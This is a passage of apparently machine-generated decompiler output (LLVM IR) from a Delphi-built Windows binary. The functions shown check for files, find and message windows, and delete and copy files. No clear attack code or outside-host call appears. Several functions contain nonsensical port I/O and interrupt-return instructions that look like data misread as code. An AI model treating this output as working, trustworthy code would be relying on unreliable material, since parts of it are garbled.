  %19 = add i32 %18, 1, !insn.addr !1082
  %20 = icmp eq i32 %19, 0, !insn.addr !1082
  store i32 %19, i32* @global_var_4096b4, align 4, !insn.addr !1082
  %21 = icmp eq i1 %20, false, !insn.addr !1083
  br i1 %21, label %dec_label_pc_405b51, label %dec_label_pc_405b3d, !insn.addr !1083

dec_label_pc_405b3d:                              ; preds = %dec_label_pc_405b17
  %22 = call i32 @"@LStrClr"(), !insn.addr !1084
  %23 = call i32 @"@LStrClr"(), !insn.addr !1085
  br label %dec_label_pc_405b51, !insn.addr !1085

dec_label_pc_405b51:                              ; preds = %dec_label_pc_405b3d, %dec_label_pc_405b17
  %24 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1086
  call void @__writefsdword(i32 0, i32 %24), !insn.addr !1087
  ret i32 0, !insn.addr !1088
}

define i32 @function_405b5f() local_unnamed_addr {
dec_label_pc_405b5f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1089
  ret i32 %0, !insn.addr !1089
}

define i32 @function_405b64() local_unnamed_addr {
dec_label_pc_405b64:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1090
}

define i32 @function_405b66(i32 %arg1) local_unnamed_addr {
dec_label_pc_405b66:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1091
}

define i32 @function_405b68() local_unnamed_addr {
dec_label_pc_405b68:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096b4, align 4, !insn.addr !1092
  %2 = add i32 %1, -1, !insn.addr !1092
  store i32 %2, i32* @global_var_4096b4, align 4, !insn.addr !1092
  ret i32 %0, !insn.addr !1093
}

define i32 @function_405b70() local_unnamed_addr {
dec_label_pc_405b70:
  %esp.0.reg2mem = alloca i32, !insn.addr !1094
  %0 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-104 = alloca i32, align 4
  %stack_var_-64 = alloca i8*, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-28 = alloca i8*, align 4
  %stack_var_-24 = alloca i32, align 4
  %1 = ptrtoint i32* %stack_var_-24 to i32, !insn.addr !1095
  %2 = icmp eq i32 %0, 0, !insn.addr !1096
  store i32 %1, i32* %esp.0.reg2mem, !insn.addr !1097
  br i1 %2, label %dec_label_pc_405c7a, label %dec_label_pc_405b8a, !insn.addr !1097

dec_label_pc_405b8a:                              ; preds = %dec_label_pc_405b70
  %3 = call i32 @function_4036c8(), !insn.addr !1098
  %4 = inttoptr i32 %3 to i8*, !insn.addr !1099
  store i8* %4, i8** %stack_var_-28, align 4, !insn.addr !1099
  %5 = ptrtoint i8** %stack_var_-28 to i32, !insn.addr !1099
  %6 = call i1 @PathFileExistsA(i8* %4), !insn.addr !1100
  %7 = icmp eq i1 %6, false, !insn.addr !1101
  store i32 %5, i32* %esp.0.reg2mem, !insn.addr !1102
  br i1 %7, label %dec_label_pc_405c7a, label %dec_label_pc_405ba5, !insn.addr !1102

dec_label_pc_405ba5:                              ; preds = %dec_label_pc_405b8a
  %8 = load i8*, i8** %stack_var_-28, align 4
  %9 = call i32* @FindWindowExA(i32* null, i32* bitcast ([7 x i8]* @global_var_405c88 to i32*), i8* null, i8* %8), !insn.addr !1103
  %10 = ptrtoint i32* %9 to i32, !insn.addr !1103
  store i32 %10, i32* %stack_var_-48, align 4, !insn.addr !1104
  %11 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1104
  %12 = call i1 @IsWindow(i32* %9), !insn.addr !1105
  %13 = icmp eq i1 %12, false, !insn.addr !1106
  store i32 %11, i32* %esp.0.reg2mem, !insn.addr !1107
  br i1 %13, label %dec_label_pc_405c7a, label %dec_label_pc_405bce, !insn.addr !1107

dec_label_pc_405bce:                              ; preds = %dec_label_pc_405ba5
  %14 = call i32 @function_4034c8(), !insn.addr !1108
  %15 = add i32 %14, 22, !insn.addr !1109
  store i32 66, i32* %stack_var_-56, align 4, !insn.addr !1110
  %16 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1110
  %17 = call i32* @GlobalAlloc(i32 %15, i32 66), !insn.addr !1111
  %18 = icmp eq i32* %17, null, !insn.addr !1112
  store i32 %16, i32* %esp.0.reg2mem, !insn.addr !1113
  br i1 %18, label %dec_label_pc_405c7a, label %dec_label_pc_405bed, !insn.addr !1113

dec_label_pc_405bed:                              ; preds = %dec_label_pc_405bce
  %19 = call i32* @GlobalLock(i32* nonnull %17), !insn.addr !1114
  %20 = icmp eq i32* %19, null, !insn.addr !1115
  %21 = icmp eq i1 %20, false, !insn.addr !1116
  br i1 %21, label %dec_label_pc_405c01, label %dec_label_pc_405bf9, !insn.addr !1116

dec_label_pc_405bf9:                              ; preds = %dec_label_pc_405bed
  %22 = bitcast i32* %17 to i8*, !insn.addr !1117
  store i8* %22, i8** %stack_var_-64, align 4, !insn.addr !1117
  %23 = ptrtoint i8** %stack_var_-64 to i32, !insn.addr !1117
  %24 = call i32* @GlobalFree(i32* nonnull %17), !insn.addr !1118
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1119
  br label %dec_label_pc_405c7a, !insn.addr !1119

dec_label_pc_405c01:                              ; preds = %dec_label_pc_405bed
  %25 = ptrtoint i32* %17 to i32, !insn.addr !1111
  %26 = ptrtoint i32* %19 to i32, !insn.addr !1114
  store i32 20, i32* %19, align 4, !insn.addr !1120
  %27 = add i32 %26, 4, !insn.addr !1121
  %28 = inttoptr i32 %27 to i32*, !insn.addr !1121
  store i32 0, i32* %28, align 4, !insn.addr !1121
  %29 = add i32 %26, 8, !insn.addr !1122
  %30 = inttoptr i32 %29 to i32*, !insn.addr !1122
  store i32 0, i32* %30, align 4, !insn.addr !1122
  %31 = add i32 %26, 12, !insn.addr !1123
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1123
  store i32 0, i32* %32, align 4, !insn.addr !1123
  %33 = add i32 %26, 16, !insn.addr !1124
  %34 = inttoptr i32 %33 to i32*, !insn.addr !1124
  store i32 0, i32* %34, align 4, !insn.addr !1124
  %35 = call i32 @function_4036c8(), !insn.addr !1125
  %36 = inttoptr i32 %35 to i8*, !insn.addr !1126
  store i8* %36, i8** %stack_var_-64, align 4, !insn.addr !1126
  %37 = add i32 %26, 20, !insn.addr !1127
  %38 = inttoptr i32 %37 to i8*, !insn.addr !1128
  %39 = call i8* @lstrcpyA(i8* %36, i8* %38), !insn.addr !1129
  %40 = call i1 @GlobalUnlock(i32* nonnull %17), !insn.addr !1130
  %41 = call i1 @PostMessageA(i32* null, i32 %25, i32 563, i32 %10), !insn.addr !1131
  %42 = call i32 @function_406f2c(i32 4218000, i32 2000, i32 -1), !insn.addr !1132
  store i32 %42, i32* %stack_var_-104, align 4, !insn.addr !1133
  %43 = ptrtoint i32* %stack_var_-104 to i32, !insn.addr !1133
  %44 = inttoptr i32 %42 to i32*, !insn.addr !1134
  %45 = call i1 @IsWindow(i32* %44), !insn.addr !1134
  %46 = icmp eq i1 %45, false, !insn.addr !1135
  store i32 %43, i32* %esp.0.reg2mem, !insn.addr !1136
  br i1 %46, label %dec_label_pc_405c7a, label %dec_label_pc_405c6b, !insn.addr !1136

dec_label_pc_405c6b:                              ; preds = %dec_label_pc_405c01
  store i32 %42, i32* %stack_var_-120, align 4, !insn.addr !1137
  %47 = ptrtoint i32* %stack_var_-120 to i32, !insn.addr !1137
  %48 = call i32 @SendMessageA(i32* null, i32 0, i32 245, i32 %42), !insn.addr !1138
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1138
  br label %dec_label_pc_405c7a, !insn.addr !1138

dec_label_pc_405c7a:                              ; preds = %dec_label_pc_405c6b, %dec_label_pc_405c01, %dec_label_pc_405bf9, %dec_label_pc_405bce, %dec_label_pc_405ba5, %dec_label_pc_405b8a, %dec_label_pc_405b70
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %49 = add i32 %esp.0.reload, 4, !insn.addr !1139
  %50 = inttoptr i32 %49 to i32*, !insn.addr !1139
  %51 = load i32, i32* %50, align 4, !insn.addr !1139
  ret i32 %51, !insn.addr !1140
}

define i32 @function_405c85(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
dec_label_pc_405c85:
  %ebp.0.reg2mem = alloca i32, !insn.addr !1141
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %ebx = alloca i32, align 4
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-12 = alloca i32, align 4
  %5 = trunc i32 %4 to i8
  %6 = mul i8 %5, 2, !insn.addr !1141
  %7 = inttoptr i32 %4 to i8*, !insn.addr !1141
  store i8 %6, i8* %7, align 1, !insn.addr !1141
  %8 = bitcast i32* %ebx to i8*
  %9 = load i8, i8* %8, align 4, !insn.addr !1142
  %10 = udiv i32 %4, 256, !insn.addr !1142
  %11 = trunc i32 %10 to i8, !insn.addr !1142
  %12 = add i8 %9, %11, !insn.addr !1142
  %13 = load i32, i32* %ebx, align 4, !insn.addr !1142
  %14 = inttoptr i32 %13 to i8*, !insn.addr !1142
  store i8 %12, i8* %14, align 1, !insn.addr !1142
  %15 = and i32 %4, 14
  %16 = icmp ugt i32 %15, 9, !insn.addr !1143
  %17 = add i32 %4, 6, !insn.addr !1143
  %18 = select i1 %16, i32 %17, i32 %4, !insn.addr !1143
  %19 = zext i1 %16 to i32, !insn.addr !1143
  %20 = and i32 %4, -65536, !insn.addr !1143
  %21 = and i32 %18, 14
  %22 = icmp ugt i32 %21, 9, !insn.addr !1144
  %23 = or i1 %16, %22, !insn.addr !1144
  %24 = add i32 %18, 6, !insn.addr !1144
  %25 = select i1 %23, i32 %24, i32 %18, !insn.addr !1144
  %26 = zext i1 %23 to i32, !insn.addr !1144
  %27 = and i32 %25, 15, !insn.addr !1144
  %28 = or i32 %27, %20, !insn.addr !1144
  %reass.add = add nuw nsw i32 %26, %19
  %reass.mul = mul i32 %reass.add, 256
  %29 = add i32 %reass.mul, %4
  %30 = and i32 %29, 65280, !insn.addr !1144
  %31 = or i32 %28, %30, !insn.addr !1144
  %32 = inttoptr i32 %31 to i8*, !insn.addr !1145
  %33 = load i8, i8* %32, align 1, !insn.addr !1145
  %34 = trunc i32 %27 to i8, !insn.addr !1145
  %35 = xor i8 %33, %34, !insn.addr !1145
  store i8 %35, i8* %32, align 1, !insn.addr !1145
  %36 = add i32 %0, 1311123697, !insn.addr !1146
  %37 = inttoptr i32 %36 to i8*, !insn.addr !1146
  %38 = load i8, i8* %37, align 1, !insn.addr !1146
  %39 = udiv i32 %3, 256, !insn.addr !1146
  %40 = trunc i32 %39 to i8, !insn.addr !1146
  %41 = add i8 %38, %40, !insn.addr !1146
  store i8 %41, i8* %37, align 1, !insn.addr !1146
  %42 = inttoptr i32 %31 to i32*, !insn.addr !1147
  %43 = load i32, i32* %42, align 4, !insn.addr !1147
  %44 = sub i32 %43, %31, !insn.addr !1147
  store i32 %44, i32* %42, align 4, !insn.addr !1147
  %45 = add i32 %3, 117, !insn.addr !1148
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1148
  %47 = load i8, i8* %46, align 1, !insn.addr !1148
  %48 = add i8 %47, %34, !insn.addr !1148
  %49 = icmp eq i8 %48, 0, !insn.addr !1148
  store i8 %48, i8* %46, align 1, !insn.addr !1148
  br i1 %49, label %dec_label_pc_405d10, label %dec_label_pc_405c9c, !insn.addr !1149

dec_label_pc_405c9c:                              ; preds = %dec_label_pc_405c85
  %50 = xor i32 %3, %1, !insn.addr !1150
  %51 = trunc i32 %3 to i16, !insn.addr !1151
  %52 = inttoptr i32 %50 to i32*, !insn.addr !1151
  %53 = load i32, i32* %52, align 4, !insn.addr !1151
  call void @__asm_outsd(i16 %51, i32 %53), !insn.addr !1151
  %54 = inttoptr i32 %50 to i8*, !insn.addr !1152
  %55 = load i8, i8* %54, align 1, !insn.addr !1152
  call void @__asm_outsb(i16 %51, i8 %55), !insn.addr !1152
  %56 = load i8, i8* %32, align 1, !insn.addr !1153
  %57 = add i8 %56, %34, !insn.addr !1153
  store i8 %57, i8* %32, align 1, !insn.addr !1153
  %58 = call i32 @__asm_iretd(), !insn.addr !1154
  %59 = add i32 %2, -117, !insn.addr !1155
  %60 = inttoptr i32 %59 to i8*, !insn.addr !1155
  %61 = load i8, i8* %60, align 1, !insn.addr !1155
  %62 = add i8 %61, -69, !insn.addr !1155
  store i8 %62, i8* %60, align 1, !insn.addr !1155
  %63 = call i8 @__asm_in(i16 -11077), !insn.addr !1156
  %64 = call i32 @__readfsdword(i32 0), !insn.addr !1157
  store i32 %64, i32* %stack_var_-12, align 4, !insn.addr !1157
  %65 = ptrtoint i32* %stack_var_-12 to i32, !insn.addr !1157
  call void @__writefsdword(i32 0, i32 %65), !insn.addr !1158
  %66 = load i32, i32* @global_var_4096bc, align 4, !insn.addr !1159
  %67 = add i32 %66, 1, !insn.addr !1159
  store i32 %67, i32* @global_var_4096bc, align 4, !insn.addr !1159
  %68 = load i32, i32* %stack_var_-12, align 4, !insn.addr !1160
  call void @__writefsdword(i32 0, i32 %68), !insn.addr !1161
  ret i32 0, !insn.addr !1162

dec_label_pc_405d10:                              ; preds = %dec_label_pc_405c85
  %69 = call i32 @function_403c90(), !insn.addr !1163
  store i32 %69, i32* %ebx, align 4, !insn.addr !1164
  %70 = icmp slt i32 %69, 0, !insn.addr !1165
  br i1 %70, label %dec_label_pc_405d38, label %dec_label_pc_405d20, !insn.addr !1166

dec_label_pc_405d20:                              ; preds = %dec_label_pc_405d10
  %71 = add i32 %69, 1, !insn.addr !1167
  store i32 %71, i32* %ebx, align 4, !insn.addr !1167
  %72 = call i32 @"@LStrCmp"(), !insn.addr !1168
  br label %dec_label_pc_405d79

dec_label_pc_405d38:                              ; preds = %dec_label_pc_405d10
  %73 = call i32 @function_403c88(), !insn.addr !1169
  %74 = call i32 @"@DynArraySetLength"(), !insn.addr !1170
  %75 = call i32 @function_403c90(), !insn.addr !1171
  %76 = call i32 @"@LStrAsg"(), !insn.addr !1172
  store i32 -1, i32* %ebp.0.reg2mem, !insn.addr !1173
  br label %dec_label_pc_405d79, !insn.addr !1173

dec_label_pc_405d79:                              ; preds = %dec_label_pc_405d20, %dec_label_pc_405d38
  %ebp.0.reload = load i32, i32* %ebp.0.reg2mem
  ret i32 %ebp.0.reload, !insn.addr !1174
}

define i32 @function_405d80() local_unnamed_addr {
dec_label_pc_405d80:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1175
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1175
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1175
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1176
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1177
  %3 = add i32 %2, 1, !insn.addr !1177
  %4 = icmp eq i32 %3, 0, !insn.addr !1177
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1177
  %5 = icmp eq i1 %4, false, !insn.addr !1178
  br i1 %5, label %dec_label_pc_405da9, label %dec_label_pc_405d99, !insn.addr !1178

dec_label_pc_405d99:                              ; preds = %dec_label_pc_405d80
  %6 = call i32 @"@DynArrayClear"(), !insn.addr !1179
  br label %dec_label_pc_405da9, !insn.addr !1179

dec_label_pc_405da9:                              ; preds = %dec_label_pc_405d99, %dec_label_pc_405d80
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1180
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1181
  ret i32 0, !insn.addr !1182
}

define i32 @function_405db7() local_unnamed_addr {
dec_label_pc_405db7:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1183
  ret i32 %0, !insn.addr !1183
}

define i32 @function_405dbc() local_unnamed_addr {
dec_label_pc_405dbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1184
}

define i32 @function_405dbe(i32 %arg1) local_unnamed_addr {
dec_label_pc_405dbe:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1185
}

define i32 @function_405dc0() local_unnamed_addr {
dec_label_pc_405dc0:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1186
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1186
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1186
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1187
  %2 = load i32, i32* @global_var_4096c0, align 4, !insn.addr !1188
  %3 = add i32 %2, -1, !insn.addr !1188
  %4 = icmp eq i32 %2, 0, !insn.addr !1188
  store i32 %3, i32* @global_var_4096c0, align 4, !insn.addr !1188
  %5 = icmp eq i1 %4, false, !insn.addr !1189
  br i1 %5, label %dec_label_pc_405df4, label %dec_label_pc_405dda, !insn.addr !1189

dec_label_pc_405dda:                              ; preds = %dec_label_pc_405dc0
  %6 = call i32 @"@DynArraySetLength"(), !insn.addr !1190
  br label %dec_label_pc_405df4, !insn.addr !1191

dec_label_pc_405df4:                              ; preds = %dec_label_pc_405dda, %dec_label_pc_405dc0
  %7 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1192
  call void @__writefsdword(i32 0, i32 %7), !insn.addr !1193
  ret i32 0, !insn.addr !1194
}

define i32 @function_405e02() local_unnamed_addr {
dec_label_pc_405e02:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1195
  ret i32 %0, !insn.addr !1195
}

define i32 @function_405e07() local_unnamed_addr {
dec_label_pc_405e07:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1196
}

define i32 @function_405e09(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e09:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1197
}

define i32 @function_405e0c(i32 %arg1) local_unnamed_addr {
dec_label_pc_405e0c:
  %esp.0.reg2mem = alloca i32, !insn.addr !1198
  %.reg2mem = alloca i8, !insn.addr !1198
  %esi = alloca i32, align 4
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = call i32 @__decompiler_undefined_function_0()
  %4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-76 = alloca i8*, align 4
  %stack_var_-60 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  call void @__asm_into(i32 %4), !insn.addr !1198
  %5 = trunc i32 %2 to i8, !insn.addr !1199
  %6 = and i8 %5, 31, !insn.addr !1199
  %7 = icmp eq i8 %6, 0, !insn.addr !1199
  br i1 %7, label %dec_label_pc_405e0c._crit_edge, label %9, !insn.addr !1199

dec_label_pc_405e0c._crit_edge:                   ; preds = %dec_label_pc_405e0c
  %8 = trunc i32 %0 to i8
  store i8 %8, i8* %.reg2mem
  br label %14

; <label>:9:                                      ; preds = %dec_label_pc_405e0c
  %10 = add i32 %1, -959064636, !insn.addr !1199
  %11 = inttoptr i32 %10 to i8*, !insn.addr !1199
  %12 = load i8, i8* %11, align 1, !insn.addr !1199
  %13 = shl i8 %12, %6, !insn.addr !1199
  store i8 %13, i8* %11, align 1, !insn.addr !1199
  %.phi.trans.insert = bitcast i32* %esi to i8*
  %.pre = load i8, i8* %.phi.trans.insert, align 4
  store i8 %.pre, i8* %.reg2mem, !insn.addr !1199
  br label %14, !insn.addr !1199

; <label>:14:                                     ; preds = %dec_label_pc_405e0c._crit_edge, %9
  %.reload = load i8, i8* %.reg2mem, !insn.addr !1200
  %15 = zext i8 %.reload to i32, !insn.addr !1200
  %16 = and i32 %3, -256, !insn.addr !1200
  %17 = or i32 %16, %15, !insn.addr !1200
  %18 = inttoptr i32 %17 to i8*, !insn.addr !1201
  %19 = load i8, i8* %18, align 1, !insn.addr !1201
  %factor = mul i8 %.reload, 30
  %20 = add i8 %factor, %19, !insn.addr !1202
  store i8 %20, i8* %18, align 1, !insn.addr !1202
  store i32 0, i32* %stack_var_-16, align 4, !insn.addr !1203
  store i32 %arg1, i32* %esi, align 4, !insn.addr !1204
  %21 = call i32 @__readfsdword(i32 0), !insn.addr !1205
  store i32 %21, i32* %stack_var_-48, align 4, !insn.addr !1205
  %22 = ptrtoint i32* %stack_var_-48 to i32, !insn.addr !1205
  call void @__writefsdword(i32 0, i32 %22), !insn.addr !1206
  store i32 %arg1, i32* %stack_var_-56, align 4, !insn.addr !1207
  %23 = ptrtoint i32* %stack_var_-56 to i32, !insn.addr !1207
  %24 = call i32 @GetClassLongA(i32* inttoptr (i32 -1 to i32*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1208
  %25 = icmp eq i32 %24, 32770, !insn.addr !1209
  %26 = icmp eq i1 %25, false, !insn.addr !1210
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1210
  br i1 %26, label %dec_label_pc_405f34, label %dec_label_pc_405e88, !insn.addr !1210

dec_label_pc_405e88:                              ; preds = %14
  %27 = call i32 @function_407020(), !insn.addr !1211
  %28 = call i32 @"@LStrPos"(), !insn.addr !1212
  %29 = call i32 @"@LStrPos"(), !insn.addr !1213
  %30 = add i32 %29, -1, !insn.addr !1214
  %31 = icmp slt i32 %30, 0, !insn.addr !1215
  %32 = add i32 %28, 2, !insn.addr !1216
  %33 = icmp sgt i32 %32, %30, !insn.addr !1217
  %or.cond = or i1 %31, %33
  store i32 %23, i32* %esp.0.reg2mem, !insn.addr !1218
  br i1 %or.cond, label %dec_label_pc_405f34, label %dec_label_pc_405ebc, !insn.addr !1218

dec_label_pc_405ebc:                              ; preds = %dec_label_pc_405e88
  %34 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1219
  store i32 %34, i32* %stack_var_-60, align 4, !insn.addr !1219
  %35 = ptrtoint i32* %stack_var_-60 to i32, !insn.addr !1219
  %36 = call i32 @"@LStrCopy"(), !insn.addr !1220
  %37 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1221
  %38 = icmp eq i32 %37, 0, !insn.addr !1221
  store i32 %35, i32* %esp.0.reg2mem, !insn.addr !1222
  br i1 %38, label %dec_label_pc_405f34, label %dec_label_pc_405ee4, !insn.addr !1222

dec_label_pc_405ee4:                              ; preds = %dec_label_pc_405ebc
  %39 = call i32 @function_406e08(), !insn.addr !1223
  %40 = call i32 @"@LStrFromPChar"(), !insn.addr !1224
  %41 = call i32 @"@LStrCat"(), !insn.addr !1225
  %42 = call i32 @function_4036c8(), !insn.addr !1226
  %43 = inttoptr i32 %42 to i8*, !insn.addr !1227
  %44 = call i1 @DeleteFileA(i8* %43), !insn.addr !1228
  %45 = call i32 @function_4036c8(), !insn.addr !1229
  %46 = inttoptr i32 %45 to i8*, !insn.addr !1230
  store i8* %46, i8** %stack_var_-76, align 4, !insn.addr !1230
  %47 = ptrtoint i8** %stack_var_-76 to i32, !insn.addr !1230
  %48 = call i1 @CopyFileA(i8* %46, i8* bitcast (i32* @0 to i8*), i1 ptrtoint (i32* @0 to i1)), !insn.addr !1231
  %49 = call i32 @function_405b70(), !insn.addr !1232
  store i32 %47, i32* %esp.0.reg2mem, !insn.addr !1232
  br label %dec_label_pc_405f34, !insn.addr !1232

dec_label_pc_405f34:                              ; preds = %dec_label_pc_405ee4, %dec_label_pc_405ebc, %dec_label_pc_405e88, %14
  %esp.0.reload = load i32, i32* %esp.0.reg2mem
  %50 = inttoptr i32 %esp.0.reload to i32*, !insn.addr !1233
  %51 = load i32, i32* %50, align 4, !insn.addr !1233
  call void @__writefsdword(i32 0, i32 %51), !insn.addr !1234
  %52 = add i32 %esp.0.reload, 8, !insn.addr !1235
  %53 = inttoptr i32 %52 to i32*, !insn.addr !1235
  store i32 4218710, i32* %53, align 4, !insn.addr !1235
  %54 = call i32 @"@LStrArrayClr"(), !insn.addr !1236
  ret i32 %54, !insn.addr !1237
}

define i32 @function_405f4f() local_unnamed_addr {
dec_label_pc_405f4f:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1238
  ret i32 %0, !insn.addr !1238
}

define i32 @function_405f54() local_unnamed_addr {
dec_label_pc_405f54:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1239
}

define i32 @function_405f56(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
dec_label_pc_405f56:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = add i32 %0, -4, !insn.addr !1240
  %2 = inttoptr i32 %1 to i32*, !insn.addr !1240
  %3 = load i32, i32* %2, align 4, !insn.addr !1240
  ret i32 %3, !insn.addr !1241
}

define i32 @function_405f67() local_unnamed_addr {
dec_label_pc_405f67:
  %0 = call i32 @__decompiler_undefined_function_0()
  %eax = alloca i32, align 4
  %1 = add i32 %0, 1, !insn.addr !1242
  %2 = inttoptr i32 %0 to i32*, !insn.addr !1242
  store i32 %1, i32* %2, align 4, !insn.addr !1242
  %3 = bitcast i32* %eax to i8*
  %4 = load i8, i8* %3, align 4, !insn.addr !1243
  %5 = load i32, i32* %eax, align 4
  %6 = trunc i32 %5 to i8, !insn.addr !1243
  %7 = add i8 %4, %6, !insn.addr !1243
  %8 = inttoptr i32 %5 to i8*, !insn.addr !1243
  store i8 %7, i8* %8, align 1, !insn.addr !1243
  %9 = load i32, i32* %eax, align 4, !insn.addr !1244
  ret i32 %9, !insn.addr !1244
}

define i32 @function_405f76() local_unnamed_addr {
dec_label_pc_405f76:
  %0 = call i32 @__decompiler_undefined_function_0()
  %edx = alloca i32, align 4
  %1 = call i32 @__decompiler_undefined_function_0()
  %2 = call i32 @__decompiler_undefined_function_0()
  %3 = trunc i32 %2 to i8
  %4 = mul i8 %3, 2, !insn.addr !1245
  %5 = inttoptr i32 %2 to i8*, !insn.addr !1245
  store i8 %4, i8* %5, align 1, !insn.addr !1245
  %6 = mul i32 %0, 4096, !insn.addr !1246
  %7 = udiv i32 %0, 1048576, !insn.addr !1246
  %8 = or i32 %7, %6, !insn.addr !1246
  %9 = and i32 %0, 1048576, !insn.addr !1246
  %10 = icmp eq i32 %9, 0, !insn.addr !1246
  %11 = load i32, i32* %edx, align 4, !insn.addr !1247
  %12 = trunc i32 %11 to i16, !insn.addr !1247
  %13 = call i8 @__asm_in(i16 %12), !insn.addr !1247
  %14 = sext i8 %13 to i32, !insn.addr !1247
  %15 = or i32 %2, %14, !insn.addr !1247
  %16 = select i1 %10, i32 0, i32 255, !insn.addr !1248
  %17 = and i32 %15, -256, !insn.addr !1248
  %18 = or i32 %17, %16, !insn.addr !1248
  %19 = inttoptr i32 %18 to i8*, !insn.addr !1249
  %20 = load i8, i8* %19, align 1, !insn.addr !1249
  %21 = mul i8 %20, 2, !insn.addr !1249
  %22 = lshr i8 %20, 7, !insn.addr !1249
  %23 = or i8 %22, %21, !insn.addr !1249
  store i8 %23, i8* %19, align 1, !insn.addr !1249
  %24 = bitcast i32* %edx to i8*
  %25 = load i8, i8* %24, align 4, !insn.addr !1250
  %26 = udiv i32 %1, 256, !insn.addr !1250
  %27 = trunc i32 %26 to i8, !insn.addr !1250
  %28 = add i8 %25, %27, !insn.addr !1250
  %29 = load i32, i32* %edx, align 4, !insn.addr !1250
  %30 = inttoptr i32 %29 to i8*, !insn.addr !1250
  store i8 %28, i8* %30, align 1, !insn.addr !1250
  %31 = add i32 %8, -4, !insn.addr !1251
  %32 = inttoptr i32 %31 to i32*, !insn.addr !1251
  store i32 4218448, i32* %32, align 4, !insn.addr !1251
  %33 = call i1 @EnumWindows(i1 (i32*, i32)* bitcast (i32* @0 to i1 (i32*, i32)*), i32 ptrtoint (i32* @0 to i32)), !insn.addr !1252
  %34 = sext i1 %33 to i32, !insn.addr !1252
  ret i32 %34, !insn.addr !1253
}

define i32 @function_405f80(i32 %arg1) local_unnamed_addr {
dec_label_pc_405f80:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0
}

define i32 @function_405f90() local_unnamed_addr {
dec_label_pc_405f90:
  %stack_var_-16 = alloca i32, align 4
  %0 = call i32 @__readfsdword(i32 0), !insn.addr !1254
  store i32 %0, i32* %stack_var_-16, align 4, !insn.addr !1254
  %1 = ptrtoint i32* %stack_var_-16 to i32, !insn.addr !1254
  call void @__writefsdword(i32 0, i32 %1), !insn.addr !1255
  %2 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1256
  %3 = add i32 %2, 1, !insn.addr !1256
  store i32 %3, i32* @global_var_4096c8, align 4, !insn.addr !1256
  %4 = load i32, i32* %stack_var_-16, align 4, !insn.addr !1257
  call void @__writefsdword(i32 0, i32 %4), !insn.addr !1258
  ret i32 0, !insn.addr !1259
}

define i32 @function_405fb5() local_unnamed_addr {
dec_label_pc_405fb5:
  %0 = call i32 @"@HandleFinally"(), !insn.addr !1260
  ret i32 %0, !insn.addr !1260
}

define i32 @function_405fba() local_unnamed_addr {
dec_label_pc_405fba:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1261
}

define i32 @function_405fbc(i32 %arg1) local_unnamed_addr {
dec_label_pc_405fbc:
  %0 = call i32 @__decompiler_undefined_function_0()
  ret i32 %0, !insn.addr !1262
}

define i32 @function_405fc0() local_unnamed_addr {
dec_label_pc_405fc0:
  %0 = call i32 @__decompiler_undefined_function_0()
  %1 = load i32, i32* @global_var_4096c8, align 4, !insn.addr !1263
  %2 = add i32 %1, -1, !insn.addr !1263
  store i32 %2, i32* @global_var_4096c8, align 4, !insn.addr !1263
